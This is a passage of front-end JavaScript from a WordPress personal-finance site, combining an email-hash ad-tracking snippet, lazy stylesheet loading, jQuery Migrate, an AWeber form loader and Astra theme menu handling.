!function () {
  "use strict";

  var t = new URL(window.location.href),
    e = Array.from(t.searchParams.entries()).map(t => `${t[0]}=${t[1]}`);
  const a = t => t.replace(/\s/g, ""),
    r = async t => {
      const e = {
        sha256Hash: "",
        sha1Hash: ""
      };
      if (!("msCrypto" in window) && "https:" === location.protocol && "crypto" in window && "TextEncoder" in window) {
        const a = new TextEncoder().encode(t),
          [r, o] = await Promise.all([n("SHA-256", a), n("SHA-1", a)]);
        e.sha256Hash = r, e.sha1Hash = o;
      }
      return e;
    },
    n = async (t, e) => {
      const a = await crypto.subtle.digest(t, e);
      return Array.from(new Uint8Array(a)).map(t => ("00" + t.toString(16)).slice(-2)).join("");
    };
  function o(t) {
    let e = !0;
    return Object.keys(t).forEach(a => {
      0 === t[a].length && (e = !1);
    }), e;
  }
  function s() {
    e.splice(i, 1);
    var a = "?" + e.join("&") + t.hash;
    history.replaceState(null, "", a);
  }
  for (var i = 0; i < e.length; i++) {
    var c = "adt_ei",
      l = decodeURIComponent(e[i]);
    if (0 === l.indexOf(c)) {
      var h = l.split(c + "=")[1];
      if ((t => {
        const e = t.match(/((?=([a-zA-Z0-9._!#$%+^&*()[\]<>-]+))\2@[a-zA-Z0-9._-]+\.[a-zA-Z0-9._-]+)/gi);
        return e ? e[0] : "";
      })(a(h.toLowerCase()))) {
        r(h).then(t => {
          if (o(t)) {
            var e = {
              value: t,
              created: Date.now()
            };
            localStorage.setItem(c, JSON.stringify(e)), localStorage.setItem("adt_emsrc", "url");
          }
          s();
        });
        break;
      }
      s();
      break;
    }
  }
}();
blgInited = !1;
function lazyblg1() {
  var i = function (t) {
    if (!t) return;
    var n = t.getBoundingClientRect();
    return 1888 > n.top || -1888 > n.top;
  };
  if (blgInited || !i(document.querySelector('.blocks-gallery-item,.has-very-light-gray-color,[class^="wp-block-"]'))) return;
  blgInited = !0;
  ['touchstart', 'mousemove', 'resize'].forEach(function (e) {
    window.removeEventListener(e, lazyblg1);
  });
  document.removeEventListener('scroll', sclazyblg1);
  console.log('load css/js [/wp-includes/css/dist/block-library/theme.min.css] [2/0]');
  var l = document.createElement('link');
  l.href = '/wp-includes/css/dist/block-library/theme.min.css';
  l.type = 'text/css';
  l.rel = 'stylesheet';
  l.media = 'screen';
  document.getElementsByTagName('head')[0].appendChild(l);
  var l1 = document.createElement('link');
  l1.href = '/wp-includes/css/dist/block-library/style.min.css';
  l1.type = 'text/css';
  l1.rel = 'stylesheet';
  l1.media = 'screen';
  document.getElementsByTagName('head')[0].appendChild(l1);
}
['touchstart', 'mousemove'].forEach(function (e) {
  window.addEventListener(e, lazyblg1);
});
function sclazyblg1() {
  if (window.scrollY > 53) lazyblg1();
}
document.addEventListener('scroll', sclazyblg1);
wicInited = !1;
function lazywic1() {
  var i = function (t) {
    if (!t) return;
    var n = t.getBoundingClientRect();
    return 1888 > n.top || -1888 > n.top;
  };
  if (wicInited || !i(document.querySelector('[class^="components-"]'))) return;
  wicInited = !0;
  ['touchstart', 'mousemove', 'resize'].forEach(function (e) {
    window.removeEventListener(e, lazywic1);
  });
  document.removeEventListener('scroll', sclazywic1);
  console.log('load css/js [/wp-includes/css/dist/components/style.min.css] [1/0]');
  var l = document.createElement('link');
  l.href = '/wp-includes/css/dist/components/style.min.css';
  l.type = 'text/css';
  l.rel = 'stylesheet';
  l.media = 'screen';
  document.getElementsByTagName('head')[0].appendChild(l);
}
['touchstart', 'mousemove'].forEach(function (e) {
  window.addEventListener(e, lazywic1);
});
function sclazywic1() {
  if (window.scrollY > 53) lazywic1();
}
const trackedKeys = window.trackedKeys;
document.addEventListener('scroll', sclazywic1); /*! jQuery Migrate v3.4.1 | (c) OpenJS Foundation and other contributors | jquery.org/license */
"undefined" == typeof jQuery.migrateMute && (jQuery.migrateMute = !0), function (t) {
  "use strict";

  "function" == typeof define && define.amd ? define(["jquery"], function (e) {
    return t(e, window);
  }) : "object" == typeof module && module.exports ? module.exports = t(require("jquery"), window) : t(jQuery, window);
}(function (s, n) {
  "use strict";

  function e(e) {
    return 0 <= function (e, t) {
      for (var r = /^(\d+)\.(\d+)\.(\d+)/, n = r.exec(e) || [], o = r.exec(t) || [], a = 1; a <= 3; a++) {
        if (+o[a] < +n[a]) return 1;
        if (+n[a] < +o[a]) return -1;
      }
      return 0;
    }(s.fn.jquery, e);
  }
  s.migrateVersion = "3.4.1";
  var t = Object.create(null);
  s.migrateDisablePatches = function () {
    for (var e = 0; e < arguments.length; e++) t[arguments[e]] = !0;
  }, s.migrateEnablePatches = function () {
    for (var e = 0; e < arguments.length; e++) delete t[arguments[e]];
  }, s.migrateIsPatchEnabled = function (e) {
    return !t[e];
  }, n.console && n.console.log && (s && e("3.0.0") && !e("5.0.0") || n.console.log("JQMIGRATE: jQuery 3.x-4.x REQUIRED"), s.migrateWarnings && n.console.log("JQMIGRATE: Migrate plugin loaded multiple times"), n.console.log("JQMIGRATE: Migrate is installed" + (s.migrateMute ? "" : " with logging active") + ", version " + s.migrateVersion));
  var o = {};
  function u(e, t) {
    var r = n.console;
    !s.migrateIsPatchEnabled(e) || s.migrateDeduplicateWarnings && o[t] || (o[t] = !0, s.migrateWarnings.push(t + " [" + e + "]"), r && r.warn && !s.migrateMute && (r.warn("JQMIGRATE: " + t), s.migrateTrace && r.trace && r.trace()));
  }
  function r(e, t, r, n, o) {
    Object.defineProperty(e, t, {
      configurable: !0,
      enumerable: !0,
      get: function () {
        return u(n, o), r;
      },
      set: function (e) {
        u(n, o), r = e;
      }
    });
  }
  function a(e, t, r, n, o) {
    var a = e[t];
    e[t] = function () {
      return o && u(n, o), (s.migrateIsPatchEnabled(n) ? r : a || s.noop).apply(this, arguments);
    };
  }
  function c(e, t, r, n, o) {
    if (!o) throw new Error("No warning message provided");
    return a(e, t, r, n, o), 0;
  }
  function i(e, t, r, n) {
    return a(e, t, r, n), 0;
  }
  s.migrateDeduplicateWarnings = !0, s.migrateWarnings = [], void 0 === s.migrateTrace && (s.migrateTrace = !0), s.migrateReset = function () {
    o = {}, s.migrateWarnings.length = 0;
  }, "BackCompat" === n.document.compatMode && u("quirks", "jQuery is not compatible with Quirks Mode");
  var d,
    l,
    p,
    f = {},
    m = s.fn.init,
    y = s.find,
    h = /\[(\s*[-\w]+\s*)([~|^$*]?=)\s*([-\w#]*?#[-\w#]*)\s*\]/,
    g = /\[(\s*[-\w]+\s*)([~|^$*]?=)\s*([-\w#]*?#[-\w#]*)\s*\]/g,
    v = /^[\s\uFEFF\xA0]+|([^\s\uFEFF\xA0])[\s\uFEFF\xA0]+$/g;
  for (d in i(s.fn, "init", function (e) {
    var t = Array.prototype.slice.call(arguments);
    return s.migrateIsPatchEnabled("selector-empty-id") && "string" == typeof e && "#" === e && (u("selector-empty-id", "jQuery( '#' ) is not a valid selector"), t[0] = []), m.apply(this, t);
  }, "selector-empty-id"), s.fn.init.prototype = s.fn, i(s, "find", function (t) {
    var r = Array.prototype.slice.call(arguments);
    if ("string" == typeof t && h.test(t)) try {
      n.document.querySelector(t);
    } catch (e) {
      t = t.replace(g, function (e, t, r, n) {
        return "[" + t + r + '"' + n + '"]';
      });
      try {
        n.document.querySelector(t), u("selector-hash", "Attribute selector with '#' must be quoted: " + r[0]), r[0] = t;
      } catch (e) {
        u("selector-hash", "Attribute selector with '#' was not fixed: " + r[0]);
      }
    }
    return y.apply(this, r);
  }, "selector-hash"), y) Object.prototype.hasOwnProperty.call(y, d) && (s.find[d] = y[d]);
  c(s.fn, "size", function () {
    return this.length;
  }, "size", "jQuery.fn.size() is deprecated and removed; use the .length property"), c(s, "parseJSON", function () {
    return JSON.parse.apply(null, arguments);
  }, "parseJSON", "jQuery.parseJSON is deprecated; use JSON.parse"), c(s, "holdReady", s.holdReady, "holdReady", "jQuery.holdReady is deprecated"), c(s, "unique", s.uniqueSort, "unique", "jQuery.unique is deprecated; use jQuery.uniqueSort"), r(s.expr, "filters", s.expr.pseudos, "expr-pre-pseudos", "jQuery.expr.filters is deprecated; use jQuery.expr.pseudos"), r(s.expr, ":", s.expr.pseudos, "expr-pre-pseudos", "jQuery.expr[':'] is deprecated; use jQuery.expr.pseudos"), e("3.1.1") && c(s, "trim", function (e) {
    return null == e ? "" : (e + "").replace(v, "$1");
  }, "trim", "jQuery.trim is deprecated; use String.prototype.trim"), e("3.2.0") && (c(s, "nodeName", function (e, t) {
    return e.nodeName && e.nodeName.toLowerCase() === t.toLowerCase();
  }, "nodeName", "jQuery.nodeName is deprecated"), c(s, "isArray", Array.isArray, "isArray", "jQuery.isArray is deprecated; use Array.isArray")), e("3.3.0") && (c(s, "isNumeric", function (e) {
    var t = typeof e;
    return ("number" == t || "string" == t) && !isNaN(e - parseFloat(e));
  }, "isNumeric", "jQuery.isNumeric() is deprecated"), s.each("Boolean Number String Function Array Date RegExp Object Error Symbol".split(" "), function (e, t) {
    f["[object " + t + "]"] = t.toLowerCase();
  }), c(s, "type", function (e) {
    return null == e ? e + "" : "object" == typeof e || "function" == typeof e ? f[Object.prototype.toString.call(e)] || "object" : typeof e;
  }, "type", "jQuery.type is deprecated"), c(s, "isFunction", function (e) {
    return "function" == typeof e;
  }, "isFunction", "jQuery.isFunction() is deprecated"), c(s, "isWindow", function (e) {
    return null != e && e === e.window;
  }, "isWindow", "jQuery.isWindow() is deprecated")), s.ajax && (l = s.ajax, p = /(=)\?(?=&|$)|\?\?/, i(s, "ajax", function () {
    var e = l.apply(this, arguments);
    return e.promise && (c(e, "success", e.done, "jqXHR-methods", "jQXHR.success is deprecated and removed"), c(e, "error", e.fail, "jqXHR-methods", "jQXHR.error is deprecated and removed"), c(e, "complete", e.always, "jqXHR-methods", "jQXHR.complete is deprecated and removed")), e;
  }, "jqXHR-methods"), e("4.0.0") || s.ajaxPrefilter("+json", function (e) {
    !1 !== e.jsonp && (p.test(e.url) || "string" == typeof e.data && 0 === (e.contentType || "").indexOf("application/x-www-form-urlencoded") && p.test(e.data)) && u("jsonp-promotion", "JSON-to-JSONP auto-promotion is deprecated");
  }));
  var j = s.fn.removeAttr,
    b = s.fn.toggleClass,
    w = /\S+/g;
  function x(e) {
    return e.replace(/-([a-z])/g, function (e, t) {
      return t.toUpperCase();
    });
  }
  i(s.fn, "removeAttr", function (e) {
    var r = this,
      n = !1;
    return s.each(e.match(w), function (e, t) {
      s.expr.match.bool.test(t) && r.each(function () {
        if (!1 !== s(this).prop(t)) return !(n = !0);
      }), n && (u("removeAttr-bool", "jQuery.fn.removeAttr no longer sets boolean properties: " + t), r.prop(t, !1));
    }), j.apply(this, arguments);
  }, "removeAttr-bool"), i(s.fn, "toggleClass", function (t) {
    return void 0 !== t && "boolean" != typeof t ? b.apply(this, arguments) : (u("toggleClass-bool", "jQuery.fn.toggleClass( boolean ) is deprecated"), this.each(function () {
      var e = this.getAttribute && this.getAttribute("class") || "";
      e && s.data(this, "__className__", e), this.setAttribute && this.setAttribute("class", !e && !1 !== t && s.data(this, "__className__") || "");
    }));
  }, "toggleClass-bool");
  var Q,
    A,
    R = !1,
    C = /^[a-z]/,
    N = /^(?:Border(?:Top|Right|Bottom|Left)?(?:Width|)|(?:Margin|Padding)?(?:Top|Right|Bottom|Left)?|(?:Min|Max)?(?:Width|Height))$/;
  s.swap && s.each(["height", "width", "reliableMarginRight"], function (e, t) {
    var r = s.cssHooks[t] && s.cssHooks[t].get;
    r && (s.cssHooks[t].get = function () {
      var e;
      return R = !0, e = r.apply(this, arguments), R = !1, e;
    });
  }), i(s, "swap", function (e, t, r, n) {
    var o,
      a,
      i = {};
    for (a in R || u("swap", "jQuery.swap() is undocumented and deprecated"), t) i[a] = e.style[a], e.style[a] = t[a];
    for (a in o = r.apply(e, n || []), t) e.style[a] = i[a];
    return o;
  }, "swap"), e("3.4.0") && "undefined" != typeof Proxy && (s.cssProps = new Proxy(s.cssProps || {}, {
    set: function () {
      return u("cssProps", "jQuery.cssProps is deprecated"), Reflect.set.apply(this, arguments);
    }
  })), e("4.0.0") ? (A = {
    animationIterationCount: !0,
    columnCount: !0,
    fillOpacity: !0,
    flexGrow: !0,
    flexShrink: !0,
    fontWeight: !0,
    gridArea: !0,
    gridColumn: !0,
    gridColumnEnd: !0,
    gridColumnStart: !0,
    gridRow: !0,
    gridRowEnd: !0,
    gridRowStart: !0,
    lineHeight: !0,
    opacity: !0,
    order: !0,
    orphans: !0,
    widows: !0,
    zIndex: !0,
    zoom: !0
  }, "undefined" != typeof Proxy ? s.cssNumber = new Proxy(A, {
    get: function () {
      return u("css-number", "jQuery.cssNumber is deprecated"), Reflect.get.apply(this, arguments);
    },
    set: function () {
      return u("css-number", "jQuery.cssNumber is deprecated"), Reflect.set.apply(this, arguments);
    }
  }) : s.cssNumber = A) : A = s.cssNumber, Q = s.fn.css, i(s.fn, "css", function (e, t) {
    var r,
      n,
      o = this;
    return e && "object" == typeof e && !Array.isArray(e) ? (s.each(e, function (e, t) {
      s.fn.css.call(o, e, t);
    }), this) : ("number" == typeof t && (r = x(e), n = r, C.test(n) && N.test(n[0].toUpperCase() + n.slice(1)) || A[r] || u("css-number", 'Number-typed values are deprecated for jQuery.fn.css( "' + e + '", value )')), Q.apply(this, arguments));
  }, "css-number");
  var S,
    P,
    k,
    H,
    E = s.data;
  i(s, "data", function (e, t, r) {
    var n, o, a;
    if (t && "object" == typeof t && 2 === arguments.length) {
      for (a in n = s.hasData(e) && E.call(this, e), o = {}, t) a !== x(a) ? (u("data-camelCase", "jQuery.data() always sets/gets camelCased names: " + a), n[a] = t[a]) : o[a] = t[a];
      return E.call(this, e, o), t;
    }
    return t && "string" == typeof t && t !== x(t) && (n = s.hasData(e) && E.call(this, e)) && t in n ? (u("data-camelCase", "jQuery.data() always sets/gets camelCased names: " + t), 2 < arguments.length && (n[t] = r), n[t]) : E.apply(this, arguments);
  }, "data-camelCase"), s.fx && (k = s.Tween.prototype.run, H = function (e) {
    return e;
  }, i(s.Tween.prototype, "run", function () {
    1 < s.easing[this.easing].length && (u("easing-one-arg", "'jQuery.easing." + this.easing.toString() + "' should use only one argument"), s.easing[this.easing] = H), k.apply(this, arguments);
  }, "easing-one-arg"), S = s.fx.interval, P = "jQuery.fx.interval is deprecated", n.requestAnimationFrame && Object.defineProperty(s.fx, "interval", {
    configurable: !0,
    enumerable: !0,
    get: function () {
      return n.document.hidden || u("fx-interval", P), s.migrateIsPatchEnabled("fx-interval") && void 0 === S ? 13 : S;
    },
    set: function (e) {
      u("fx-interval", P), S = e;
    }
  }));
  var M = s.fn.load,
    q = s.event.add,
    O = s.event.fix;
  s.event.props = [], s.event.fixHooks = {}, r(s.event.props, "concat", s.event.props.concat, "event-old-patch", "jQuery.event.props.concat() is deprecated and removed"), i(s.event, "fix", function (e) {
    var t,
      r = e.type,
      n = this.fixHooks[r],
      o = s.event.props;
    if (o.length) {
      u("event-old-patch", "jQuery.event.props are deprecated and removed: " + o.join());
      while (o.length) s.event.addProp(o.pop());
    }
    if (n && !n._migrated_ && (n._migrated_ = !0, u("event-old-patch", "jQuery.event.fixHooks are deprecated and removed: " + r), (o = n.props) && o.length)) while (o.length) s.event.addProp(o.pop());
    return t = O.call(this, e), n && n.filter ? n.filter(t, e) : t;
  }, "event-old-patch"), i(s.event, "add", function (e, t) {
    return e === n && "load" === t && "complete" === n.document.readyState && u("load-after-event", "jQuery(window).on('load'...) called after load event occurred"), q.apply(this, arguments);
  }, "load-after-event"), s.each(["load", "unload", "error"], function (e, t) {
    i(s.fn, t, function () {
      var e = Array.prototype.slice.call(arguments, 0);
      return "load" === t && "string" == typeof e[0] ? M.apply(this, e) : (u("shorthand-removed-v3", "jQuery.fn." + t + "() is deprecated"), e.splice(0, 0, t), arguments.length ? this.on.apply(this, e) : (this.triggerHandler.apply(this, e), this));
    }, "shorthand-removed-v3");
  }), s.each("blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu".split(" "), function (e, r) {
    c(s.fn, r, function (e, t) {
      return 0 < arguments.length ? this.on(r, null, e, t) : this.trigger(r);
    }, "shorthand-deprecated-v3", "jQuery.fn." + r + "() event shorthand is deprecated");
  }), s(function () {
    s(n.document).triggerHandler("ready");
  }), s.event.special.ready = {
    setup: function () {
      this === n.document && u("ready-event", "'ready' event is deprecated");
    }
  }, c(s.fn, "bind", function (e, t, r) {
    return this.on(e, null, t, r);
  }, "pre-on-methods", "jQuery.fn.bind() is deprecated"), c(s.fn, "unbind", function (e, t) {
    return this.off(e, null, t);
  }, "pre-on-methods", "jQuery.fn.unbind() is deprecated"), c(s.fn, "delegate", function (e, t, r, n) {
    return this.on(t, e, r, n);
  }, "pre-on-methods", "jQuery.fn.delegate() is deprecated"), c(s.fn, "undelegate", function (e, t, r) {
    return 1 === arguments.length ? this.off(e, "**") : this.off(t, e || "**", r);
  }, "pre-on-methods", "jQuery.fn.undelegate() is deprecated"), c(s.fn, "hover", function (e, t) {
    return this.on("mouseenter", e).on("mouseleave", t || e);
  }, "pre-on-methods", "jQuery.fn.hover() is deprecated");
  function T(e) {
    var t = n.document.implementation.createHTMLDocument("");
    return t.body.innerHTML = e, t.body && t.body.innerHTML;
  }
  var F = /<(?!area|br|col|embed|hr|img|input|link|meta|param)(([a-z][^\/\0>\x20\t\r\n\f]*)[^>]*)\/>/gi;
  s.UNSAFE_restoreLegacyHtmlPrefilter = function () {
    s.migrateEnablePatches("self-closed-tags");
  }, i(s, "htmlPrefilter", function (e) {
    var t, r;
    return (r = (t = e).replace(F, "<$1></$2>")) !== t && T(t) !== T(r) && u("self-closed-tags", "HTML tags must be properly nested and closed: " + t), e.replace(F, "<$1></$2>");
  }, "self-closed-tags"), s.migrateDisablePatches("self-closed-tags");
  var D,
    W,
    _,
    I = s.fn.offset;
  return i(s.fn, "offset", function () {
    var e = this[0];
    return !e || e.nodeType && e.getBoundingClientRect ? I.apply(this, arguments) : (u("offset-valid-elem", "jQuery.fn.offset() requires a valid DOM element"), arguments.length ? this : void 0);
  }, "offset-valid-elem"), s.ajax && (D = s.param, i(s, "param", function (e, t) {
    var r = s.ajaxSettings && s.ajaxSettings.traditional;
    return void 0 === t && r && (u("param-ajax-traditional", "jQuery.param() no longer uses jQuery.ajaxSettings.traditional"), t = r), D.call(this, e, t);
  }, "param-ajax-traditional")), c(s.fn, "andSelf", s.fn.addBack, "andSelf", "jQuery.fn.andSelf() is deprecated and removed, use jQuery.fn.addBack()"), s.Deferred && (W = s.Deferred, _ = [["resolve", "done", s.Callbacks("once memory"), s.Callbacks("once memory"), "resolved"], ["reject", "fail", s.Callbacks("once memory"), s.Callbacks("once memory"), "rejected"], ["notify", "progress", s.Callbacks("memory"), s.Callbacks("memory")]], i(s, "Deferred", function (e) {
    var a = W(),
      i = a.promise();
    function t() {
      var o = arguments;
      return s.Deferred(function (n) {
        s.each(_, function (e, t) {
          var r = "function" == typeof o[e] && o[e];
          a[t[1]](function () {
            var e = r && r.apply(this, arguments);
            e && "function" == typeof e.promise ? e.promise().done(n.resolve).fail(n.reject).progress(n.notify) : n[t[0] + "With"](this === i ? n.promise() : this, r ? [e] : arguments);
          });
        }), o = null;
      }).promise();
    }
    return c(a, "pipe", t, "deferred-pipe", "deferred.pipe() is deprecated"), c(i, "pipe", t, "deferred-pipe", "deferred.pipe() is deprecated"), e && e.call(a, a), a;
  }, "deferred-pipe"), s.Deferred.exceptionHook = W.exceptionHook), s;
});
var ajaxurl = "https://www.financialsamurai.com/wp-admin/admin-ajax.php";
(function (d, s, id) {
  var js;
  var fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s);
  js.id = id;
  js.src = "https://forms.aweber.com/form/57/1801663457.js";
  fjs.parentNode.insertBefore(js, fjs);
})(document, "script", "aweber-wjs-1655241928");
var astraGetParents = function (e, t) {
    Element.prototype.matches || (Element.prototype.matches = Element.prototype.matchesSelector || Element.prototype.mozMatchesSelector || Element.prototype.msMatchesSelector || Element.prototype.oMatchesSelector || Element.prototype.webkitMatchesSelector || function (e) {
      for (var t = (this.document || this.ownerDocument).querySelectorAll(e), a = t.length; 0 <= --a && t.item(a) !== this;);
      return -1 < a;
    });
    for (var a = []; e && e !== document; e = e.parentNode) (!t || e.matches(t)) && a.push(e);
    return a;
  },
  getParents = function (e, t) {
    console.warn("getParents() function has been deprecated since version 2.5.0 or above of Astra Theme and will be removed in the future. Use astraGetParents() instead."), astraGetParents(e, t);
  },
  astraToggleClass = function (e, t) {
    e.classList.contains(t) ? e.classList.remove(t) : e.classList.add(t);
  },
  toggleClass = function (e, t) {
    console.warn("toggleClass() function has been deprecated since version 2.5.0 or above of Astra Theme and will be removed in the future. Use astraToggleClass() instead."), astraToggleClass(e, t);
  },
  astraTriggerEvent = (!function () {
    function e(e, t) {
      t = t || {
        bubbles: !1,
        cancelable: !1,
        detail: void 0
      };
      var a = document.createEvent("CustomEvent");
      return a.initCustomEvent(e, t.bubbles, t.cancelable, t.detail), a;
    }
    "function" != typeof window.CustomEvent && (e.prototype = window.Event.prototype, window.CustomEvent = e);
  }(), function (e, t) {
    var a = new CustomEvent(t, 2 < arguments.length && void 0 !== arguments[2] ? arguments[2] : {});
    e.dispatchEvent(a);
  });
function generateHash(obj) {
  const keys = Object.keys(obj).sort();
  let hash = 0;
  keys.forEach(key => {
    for (let char of key) {
      let code = char.charCodeAt(0);
      hash = (hash << 5) - hash + code;
      hash |= 0; // Convert to 32bit integer
    }
  });
  return hash.toString(16);
}
astraSmoothScroll = function (e, t) {
  e.preventDefault(), window.scrollTo({
    top: t,
    left: 0,
    behavior: "smooth"
  });
}, astScrollToTopHandler = function (e, t) {
  var a = getComputedStyle(t).content,
    n = t.dataset.onDevices,
    a = a.replace(/[^0-9]/g, "");
  "both" == n || "desktop" == n && "769" == a || "mobile" == n && "" == a ? (n = window.pageYOffset || document.body.scrollTop, e && e.length ? n > e.offsetHeight + 100 ? t.style.display = "block" : t.style.display = "none" : 300 < window.pageYOffset ? t.style.display = "block" : t.style.display = "none") : t.style.display = "none";
}, function () {
  var r = document.querySelectorAll("#masthead .main-header-menu-toggle"),
    c = document.getElementById("masthead"),
    i = {},
    d = "",
    u = document.body,
    m = "";
  function e(e) {
    d = e.detail.type;
    var t = document.querySelectorAll(".menu-toggle");
    if ("dropdown" === d && (document.getElementById("ast-mobile-popup").classList.remove("active", "show"), g("updateHeader")), "off-canvas" === d) for (var a = 0; a < t.length; a++) void 0 !== t[a] && t[a].classList.contains("toggled") && t[a].click();
    n(d);
  }
  function g(e) {
    m = c.querySelector("#ast-mobile-header");
    var t = "";
    if (null == m || "dropdown" !== m.dataset.type || "updateHeader" === e) {
      t = (void 0 !== e && "updateHeader" !== e ? e.closest(".ast-mobile-popup-inner") : document.querySelector("#ast-mobile-popup")).querySelectorAll(".menu-item-has-children");
      for (var a = 0; a < t.length; a++) {
        t[a].classList.remove("ast-submenu-expanded");
        for (var n = t[a].querySelectorAll(".sub-menu"), s = 0; s < n.length; s++) n[s].style.display = "none";
      }
      var o = document.querySelectorAll(".menu-toggle");
      document.body.classList.remove("ast-main-header-nav-open", "ast-popup-nav-open"), document.documentElement.classList.remove("ast-off-canvas-active");
      for (var r = 0; r < o.length; r++) o[r].classList.remove("toggled"), o[r].style.display = "flex";
    }
  }
  function n(e) {
    var t = document.querySelectorAll("#ast-mobile-header .menu-toggle"),
      a = document.querySelectorAll("#ast-desktop-header .menu-toggle");
    if (void 0 === e && null !== c) if (m = c.querySelector("#ast-mobile-header")) e = m.dataset.type;else {
      var n = c.querySelector("#ast-desktop-header");
      if (!n) return;
      e = n.dataset.toggleType;
    }
    if ("off-canvas" === e) {
      var n = document.getElementById("menu-toggle-close"),
        s = document.querySelector(".ast-mobile-popup-inner");
      if (null == s) return;
      popupLinks = s.getElementsByTagName("a");
      for (var o = 0; o < t.length; o++) t[o].removeEventListener("click", astraNavMenuToggle, !1), t[o].addEventListener("click", popupTriggerClick, !1), t[o].trigger_type = "mobile";
      for (o = 0; o < a.length; o++) a[o].removeEventListener("click", astraNavMenuToggle, !1), a[o].addEventListener("click", popupTriggerClick, !1), a[o].trigger_type = "desktop";
      n.addEventListener("click", function (e) {
        document.getElementById("ast-mobile-popup").classList.remove("active", "show"), g(this);
      }), document.addEventListener("keyup", function (e) {
        27 === e.keyCode && (e.preventDefault(), document.getElementById("ast-mobile-popup").classList.remove("active", "show"), g());
      }), document.addEventListener("click", function (e) {
        e.target === document.querySelector(".ast-mobile-popup-drawer.active .ast-mobile-popup-overlay") && (document.getElementById("ast-mobile-popup").classList.remove("active", "show"), g());
      });
      for (let e = 0, t = popupLinks.length; e < t; e++) null !== popupLinks[e].getAttribute("href") && (popupLinks[e].getAttribute("href").startsWith("#") || -1 !== popupLinks[e].getAttribute("href").search("#")) && (!popupLinks[e].parentElement.classList.contains("menu-item-has-children") || popupLinks[e].parentElement.classList.contains("menu-item-has-children") && document.querySelector("header.site-header").classList.contains("ast-builder-menu-toggle-icon")) && (popupLinks[e].addEventListener("click", p, !0), popupLinks[e].headerType = "off-canvas");
      AstraToggleSetup();
    } else if ("dropdown" === e) {
      var r = document.querySelectorAll(".ast-mobile-header-content") || !1,
        s = document.querySelector(".ast-desktop-header-content") || !1;
      if (0 < r.length) for (let e = 0; e < r.length; e++) {
        var l = r[e].getElementsByTagName("a");
        for (link = 0, len = l.length; link < len; link++) null !== l[link].getAttribute("href") && (l[link].getAttribute("href").startsWith("#") || -1 !== l[link].getAttribute("href").search("#")) && (!l[link].parentElement.classList.contains("menu-item-has-children") || l[link].parentElement.classList.contains("menu-item-has-children") && document.querySelector("header.site-header").classList.contains("ast-builder-menu-toggle-icon")) && (l[link].addEventListener("click", p, !0), l[link].headerType = "dropdown");
      }
      if (s) {
        var i = s.getElementsByTagName("a");
        for (link = 0, len = i.length; link < len; link++) i[link].addEventListener("click", p, !0), i[link].headerType = "dropdown";
      }
      for (o = 0; o < t.length; o++) t[o].removeEventListener("click", popupTriggerClick, !1), t[o].addEventListener("click", astraNavMenuToggle, !1), t[o].trigger_type = "mobile";
      for (o = 0; o < a.length; o++) a[o].removeEventListener("click", popupTriggerClick, !1), a[o].addEventListener("click", astraNavMenuToggle, !1), a[o].trigger_type = "desktop";
      AstraToggleSetup();
    }
    v();
  }
  function p(e) {
    switch (e.currentTarget.headerType) {
      case "dropdown":
        for (var t = document.querySelectorAll(".menu-toggle.toggled"), a = 0; a < t.length; a++) t[a].click();
        break;
      case "off-canvas":
        document.getElementById("menu-toggle-close").click();
    }
  }
  "" !== (m = null != c ? c.querySelector("#ast-mobile-header") : m) && null !== m && (d = m.dataset.type), document.addEventListener("astMobileHeaderTypeChange", e, !1), popupTriggerClick = function (e) {
    var e = e.currentTarget.trigger_type,
      t = document.getElementById("ast-mobile-popup"),
      a = document.getElementById("menu-toggle-close");
    a && a.focus(), u.classList.contains("ast-popup-nav-open") || u.classList.add("ast-popup-nav-open"), u.classList.contains("ast-main-header-nav-open") || "mobile" === e || u.classList.add("ast-main-header-nav-open"), document.documentElement.classList.contains("ast-off-canvas-active") || document.documentElement.classList.add("ast-off-canvas-active"), "desktop" === e && (t.querySelector(".ast-mobile-popup-content").style.display = "none", t.querySelector(".ast-desktop-popup-content").style.display = "block"), "mobile" === e && (t.querySelector(".ast-desktop-popup-content").style.display = "none", t.querySelector(".ast-mobile-popup-content").style.display = "block"), this.style.display = "none", t.classList.add("active", "show");
  }, window.addEventListener("load", function () {
    n();
  }), document.addEventListener("astLayoutWidthChanged", function () {
    n();
  }), document.addEventListener("astPartialContentRendered", function () {
    r = document.querySelectorAll(".main-header-menu-toggle"), u.classList.remove("ast-main-header-nav-open"), document.addEventListener("astMobileHeaderTypeChange", e, !1), n(), v();
  });
  var s = null !== navigator.userAgent.match(/Android/i) && "Android" === navigator.userAgent.match(/Android/i)[0] ? window.visualViewport.width : window.innerWidth;
  window.addEventListener("resize", function () {
    var e, t, a, n;
    "INPUT" !== document.activeElement.tagName && (e = document.getElementById("menu-toggle-close"), t = document.querySelector(".menu-toggle.toggled"), a = document.querySelector("#masthead > #ast-desktop-header .ast-desktop-header-content"), n = document.querySelector(".elementor-editor-active"), a && (a.style.display = "none"), (null !== navigator.userAgent.match(/Android/i) && "Android" === navigator.userAgent.match(/Android/i)[0] ? window.visualViewport.width : window.innerWidth) !== s && (t && null === n && t.click(), document.body.classList.remove("ast-main-header-nav-open", "ast-popup-nav-open"), e) && null == n && e.click(), h(), AstraToggleSetup());
  }), document.addEventListener("DOMContentLoaded", function () {
    if (AstraToggleSetup(), null !== (e = u.classList.contains("ast-header-break-point") ? document.getElementById("ast-mobile-header") : document.getElementById("ast-desktop-header"))) {
      var e,
        t = e.querySelector(".navigation-accessibility");
      if (t && e) {
        var a = e.getElementsByTagName("button")[0];
        if (void 0 === a) {
          if (!0 === (a = e.getElementsByTagName("a")[0]).classList.contains("astra-search-icon")) return;
          if (void 0 === a) return;
        }
        var n = t.getElementsByTagName("ul")[0];
        if (void 0 === n) a.style.display = "none";else {
          if (-1 === n.className.indexOf("nav-menu") && (n.className += " nav-menu"), window.onload = function () {
            var e;
            "off-canvas" === d && (e = document.getElementById("menu-toggle-close")) && (e.onclick = function () {
              -1 !== t.className.indexOf("toggled") ? (t.className = t.className.replace(" toggled", ""), a.setAttribute("aria-expanded", "false"), n.setAttribute("aria-expanded", "false")) : (t.className += " toggled", a.setAttribute("aria-expanded", "true"), n.setAttribute("aria-expanded", "true"));
            });
          }, a.onclick = function () {
            -1 !== t.className.indexOf("toggled") ? (t.className = t.className.replace(" toggled", ""), a.setAttribute("aria-expanded", "false"), n.setAttribute("aria-expanded", "false")) : (t.className += " toggled", a.setAttribute("aria-expanded", "true"), n.setAttribute("aria-expanded", "true"));
